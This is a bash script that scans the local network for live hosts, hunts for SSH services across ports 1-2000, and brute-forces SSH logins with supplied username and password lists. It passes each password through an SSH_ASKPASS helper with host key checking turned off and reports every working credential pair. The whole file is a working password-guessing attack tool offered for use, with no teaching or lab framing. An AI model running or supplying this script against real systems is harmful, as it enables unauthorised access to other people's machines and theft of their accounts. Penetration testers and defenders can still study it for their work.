#!/bin/bash

# users.list: one username per line
# passwords.list: one password per line
# lines starting with # are ignored

USERS_FILE="${USERS_FILE:-users.list}"
PASSWORDS_FILE="${PASSWORDS_FILE:-passwords.list}"
PING_TIMEOUT="${PING_TIMEOUT:-1}"
MAX_PING_JOBS="${MAX_PING_JOBS:-64}"
SSH_SCAN_START="${SSH_SCAN_START:-1}"
SSH_SCAN_END="${SSH_SCAN_END:-2000}"

USERS=()
PASSWORDS=()
RESULTS=()
SSH_HOSTS=()
SSH_BANNER=""

load_credentials() {
  local user pass

  USERS=()
  PASSWORDS=()

  if [[ ! -f "$USERS_FILE" ]]; then
    echo "Error: users file not found: $USERS_FILE" >&2
    return 1
  fi

  if [[ ! -f "$PASSWORDS_FILE" ]]; then
    echo "Error: passwords file not found: $PASSWORDS_FILE" >&2
    return 1
  fi

  while IFS= read -r user || [[ -n "$user" ]]; do
    [[ -z "$user" || "$user" =~ ^[[:space:]]*# ]] && continue
    USERS+=("$user")
  done < "$USERS_FILE"

  while IFS= read -r pass || [[ -n "$pass" ]]; do
    [[ -z "$pass" || "$pass" =~ ^[[:space:]]*# ]] && continue
    PASSWORDS+=("$pass")
  done < "$PASSWORDS_FILE"

  if [[ ${#USERS[@]} -eq 0 ]]; then
    echo "Error: no users found in $USERS_FILE" >&2
    return 1
  fi

  if [[ ${#PASSWORDS[@]} -eq 0 ]]; then
    echo "Error: no passwords found in $PASSWORDS_FILE" >&2
    return 1
  fi
}

detect_local_networks() {
  local iface addr ip prefix scan_base
  local -a networks=()

  if command -v ip >/dev/null 2>&1; then
    while read -r iface addr; do
      [[ -z "$addr" ]] && continue
      ip="${addr%%/*}"
      prefix="${addr##*/}"
      [[ -z "$prefix" || "$prefix" == "$addr" ]] && prefix=24
      [[ ! "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && continue
      scan_base=$(get_scan_base "$ip" "$prefix")
      networks+=("$iface|$ip|$prefix|$scan_base")
    done < <(ip -4 -o addr show scope global 2>/dev/null | awk '{print $2, $4}')
  elif command -v ifconfig >/dev/null 2>&1; then
    while read -r ip; do
      [[ -z "$ip" || "$ip" == "127.0.0.1" ]] && continue
      ip="${ip%%/*}"
      [[ ! "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && continue
      scan_base=$(get_scan_base "$ip" 24)
      networks+=("unknown|$ip|24|$scan_base")
    done < <(ifconfig 2>/dev/null | awk '/inet / {print $2}')
  else
    echo "Error: cannot detect local network (ip/ifconfig not found)" >&2
    return 1
  fi

  if [[ ${#networks[@]} -eq 0 ]]; then
    return 1
  fi

  printf '%s\n' "${networks[@]}"
}

get_scan_base() {
  local ip="$1"
  local prefix="$2"
  local o1 o2 o3 o4

  IFS='.' read -r o1 o2 o3 o4 <<< "$ip"
  if (( prefix >= 24 )); then
    echo "${o1}.${o2}.${o3}"
  elif (( prefix >= 16 )); then
    echo "${o1}.${o2}.${o3}"
  else
    echo "${o1}.${o2}.${o3}"
  fi
}

is_host_alive() {
  local host="$1"

  if ping -c 1 -W "$PING_TIMEOUT" "$host" >/dev/null 2>&1; then
    return 0
  fi

  if command -v nc >/dev/null 2>&1; then
    nc -z -w "$PING_TIMEOUT" "$host" 22 >/dev/null 2>&1 && return 0
  fi

  return 1
}

scan_alive_hosts() {
  local scan_base="$1"
  local -a alive=()
  local i ip tmp result_file job_count

  result_file=$(mktemp)
  echo "Scanning alive hosts in ${scan_base}.0/24 ..." >&2

  for i in $(seq 1 254); do
    ip="${scan_base}.${i}"
    (
      if is_host_alive "$ip"; then
        echo "$ip" >> "$result_file"
      fi
    ) &

    job_count=$(jobs -rp | wc -l)
    while (( job_count >= MAX_PING_JOBS )); do
      wait -n 2>/dev/null || wait
      job_count=$(jobs -rp | wc -l)
    done
  done

  wait

  if [[ -s "$result_file" ]]; then
    mapfile -t alive < <(sort -u "$result_file")
  fi

  rm -f "$result_file"

  if [[ ${#alive[@]} -eq 0 ]]; then
    return 1
  fi

  printf '%s\n' "${alive[@]}"
}

get_ssh_banner() {
  local host="$1"
  local port="$2"
  echo | nc -w 2 "$host" "$port" 2>/dev/null | head -c 128
}

is_ssh_port() {
  local banner
  banner=$(get_ssh_banner "$1" "$2")
  [[ "$banner" =~ ^SSH- ]]
}

find_ssh_port() {
  local host="$1"
  local port banner

  if ! command -v nc >/dev/null 2>&1; then
    echo "Error: nc (netcat) is required for port scanning" >&2
    return 1
  fi

  echo "Scanning SSH on $host (ports ${SSH_SCAN_START}-${SSH_SCAN_END})..." >&2
  for port in $(seq "$SSH_SCAN_START" "$SSH_SCAN_END"); do
    banner=$(get_ssh_banner "$host" "$port")
    if [[ "$banner" =~ ^SSH- ]]; then
      SSH_BANNER="$banner"
      echo "$port"
      return 0
    fi
  done

  return 1
}

resolve_ssh_port() {
  local host="$1"
  local port="$2"
  local found_port

  if is_ssh_port "$host" "$port"; then
    SSH_BANNER=$(get_ssh_banner "$host" "$port")
    echo "$port"
    return 0
  fi

  found_port=$(find_ssh_port "$host") || return 1
  echo "$found_port"
}

attempt_ssh_login() {
  local host="$1"
  local port="$2"
  local user="$3"
  local pass="$4"
  local askpass_script

  askpass_script=$(mktemp)
  {
    echo '#!/bin/bash'
    echo "echo $(printf '%q' "$pass")"
  } > "$askpass_script"
  chmod +x "$askpass_script"

  export SSH_ASKPASS="$askpass_script"
  export SSH_ASKPASS_REQUIRE=force
  export DISPLAY="${DISPLAY:-:0}"

  if setsid ssh -p "$port" \
                -o StrictHostKeyChecking=no \
                -o PreferredAuthentications=password \
                -o PubkeyAuthentication=no \
                -o ConnectTimeout=10 \
                "$user@$host" "exit 0" </dev/null 2>/dev/null; then
    rm -f "$askpass_script"
    return 0
  fi

  rm -f "$askpass_script"
  return 1
}

try_ssh_login_on_host() {
  local host="$1"
  local port="$2"
  local user pass

  for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
      if attempt_ssh_login "$host" "$port" "$user" "$pass"; then
        RESULTS+=("${host}|${port}|${user}|${pass}|${SSH_BANNER}")
        echo "  [OK] ${host}:${port} user=${user} pass=${pass}" >&2
      fi
    done
  done
}

process_host() {
  local host="$1"
  local input_port="$2"
  local ssh_port

  echo "Checking SSH on $host ..." >&2
  if ! ssh_port=$(resolve_ssh_port "$host" "$input_port"); then
    echo "  No SSH service found on $host" >&2
    return 1
  fi

  SSH_HOSTS+=("${host}:${ssh_port}")
  echo "  SSH on $host:$ssh_port ($SSH_BANNER)" >&2
  try_ssh_login_on_host "$host" "$ssh_port"
  return 0
}

collect_scan_bases() {
  local -n _lines="$1"
  local -n _out="$2"
  local entry iface ip prefix scan_base

  _out=()
  for entry in "${_lines[@]}"; do
    IFS='|' read -r iface ip prefix scan_base <<< "$entry"
    [[ -z "$scan_base" ]] && continue
    if [[ " ${_out[*]} " != *" $scan_base "* ]]; then
      _out+=("$scan_base")
    fi
  done
}

print_network_info() {
  local -n _lines="$1"
  local entry iface ip prefix scan_base

  echo "=== Local network detection ==="
  for entry in "${_lines[@]}"; do
    IFS='|' read -r iface ip prefix scan_base <<< "$entry"
    echo "  interface: $iface"
    echo "  local ip:  $ip"
    echo "  prefix:    /$prefix"
    echo "  scan range: ${scan_base}.1 - ${scan_base}.254"
    echo "---"
  done
}

print_no_ip_found() {
  echo
  echo "=== Result ==="
  echo "No active IP found in the network."
}

print_no_valid_credentials() {
  echo
  echo "=== Result ==="
  if [[ ${#SSH_HOSTS[@]} -eq 0 ]]; then
    echo "Active IPs were found, but no SSH service was detected on any host."
  fi
  echo "No valid username/password combination found."
}

print_final_results() {
  local host port user pass banner i

  echo
  echo "=== Final results ==="

  if [[ ${#RESULTS[@]} -eq 0 ]]; then
    print_no_valid_credentials
    return 1
  fi

  for i in "${!RESULTS[@]}"; do
    IFS='|' read -r host port user pass banner <<< "${RESULTS[$i]}"
    echo "$((i + 1)). ip: $host | port: $port | user: $user | pass: $pass | banner: $banner"
  done
}

scan_network_and_test() {
  local input_port="$1"
  local -a network_lines=()
  local -a scan_bases=()
  local -a alive_hosts=()
  local scan_base host

  RESULTS=()
  SSH_HOSTS=()

  mapfile -t network_lines < <(detect_local_networks) || {
    echo "Error: no local network interfaces detected" >&2
    return 1
  }

  if [[ ${#network_lines[@]} -eq 0 ]]; then
    echo "Error: no local network interfaces detected" >&2
    return 1
  fi

  print_network_info network_lines
  collect_scan_bases network_lines scan_bases

  if [[ ${#scan_bases[@]} -eq 0 ]]; then
    echo "Error: no scan ranges detected" >&2
    return 1
  fi

  alive_hosts=()
  for scan_base in "${scan_bases[@]}"; do
    while IFS= read -r host; do
      [[ -z "$host" ]] && continue
      alive_hosts+=("$host")
    done < <(scan_alive_hosts "$scan_base" || true)
  done

  if [[ ${#alive_hosts[@]} -eq 0 ]]; then
    print_no_ip_found
    return 1
  fi

  mapfile -t alive_hosts < <(printf '%s\n' "${alive_hosts[@]}" | sort -u)

  echo
  echo "=== Alive hosts (${#alive_hosts[@]}) ==="
  printf '  %s\n' "${alive_hosts[@]}"
  echo

  for host in "${alive_hosts[@]}"; do
    process_host "$host" "$input_port" || true
  done

  print_final_results
}

run_single_host() {
  local host="$1"
  local input_port="$2"

  RESULTS=()
  SSH_HOSTS=()

  echo "Single host mode: $host"

  if ! is_host_alive "$host"; then
    print_no_ip_found
    return 1
  fi

  process_host "$host" "$input_port" || true
  print_final_results
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  HOST="${1:-${HOST:-}}"

  load_credentials || exit 1

  read -rp "Enter SSH port [22]: " INPUT_PORT
  INPUT_PORT="${INPUT_PORT:-22}"

  if ! [[ "$INPUT_PORT" =~ ^[0-9]+$ ]] || (( INPUT_PORT < 1 || INPUT_PORT > 65535 )); then
    echo "Error: invalid port number: $INPUT_PORT" >&2
    exit 1
  fi

  if [[ -n "$HOST" ]]; then
    run_single_host "$HOST" "$INPUT_PORT"
  else
    scan_network_and_test "$INPUT_PORT"
  fi
fi
